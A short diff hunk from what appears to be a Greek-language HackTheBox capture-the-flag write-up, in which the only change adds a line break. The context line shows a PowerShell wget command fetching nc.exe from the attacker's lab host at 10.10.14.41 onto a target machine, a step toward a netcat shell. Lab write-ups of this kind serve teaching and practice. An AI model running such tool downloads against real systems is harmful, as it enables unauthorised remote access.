@@ -43,7 +43,7 @@
 
 
 Για να “τραβήξουμε” το nc.exe θα πρέπει να χρησιμοποιήσουμε το ‘wget’ όπως δείχνω παρακάτω <br>
-```powershell wget http://10.10.14.41:9009/nc.exe```
+```powershell wget http://10.10.14.41:9009/nc.exe```<br>
 ![uploadnc](https://github.com/p19tzam/photos/blob/main/hackthebox-writeups-photos/uploadnc.png)
 
 
